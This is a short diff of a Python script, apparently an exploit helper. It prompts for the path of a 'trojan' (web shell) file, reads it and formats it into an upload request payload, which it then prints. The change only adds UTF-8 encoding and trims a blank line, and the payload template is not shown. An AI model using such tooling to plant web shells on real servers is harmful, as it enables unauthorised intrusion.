@@ -36,7 +36,7 @@ shell_path = input("待上传木马文件path：")
 
 if shell_path:
     try:
-        with open(shell_path, 'r') as f:
+        with open(shell_path, 'r', encoding='utf-8') as f:
             shell = f.read()
             shell_length = os.path.getsize(f.name)
     except Exception as e:
@@ -54,4 +54,3 @@ content_length = str(len(file_name)+283)
 payload = payload.format(content_length, shell_length, file_name, shell)
 
 print("The payload is :\n\n" + payload)
-
